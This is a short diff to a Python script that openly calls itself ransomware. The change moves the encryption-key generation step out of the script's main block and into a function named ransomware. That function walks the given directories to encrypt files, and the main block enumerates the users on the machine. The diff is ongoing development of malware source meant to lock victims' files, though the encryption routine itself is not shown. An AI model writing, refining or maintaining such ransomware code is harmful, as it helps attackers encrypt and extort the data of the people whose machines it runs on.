@@ -100,6 +100,10 @@ def walk_files(directory):
 
 def ransomware(dirsToEncrypt):
 
+    # Generate an encryption key.
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
+    generate_key()
+
     for dirToEncrypt in dirsToEncrypt:
 
         for file_path in walk_files(dirToEncrypt):
@@ -147,10 +151,6 @@ def enumerate_users():
 #===========================#
 
 if __name__ == '__main__':
-
-    # Generate an encryption key.
-    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
-    generate_key()
     
     # Enumerate all users on the machine.
     users = enumerate_users()
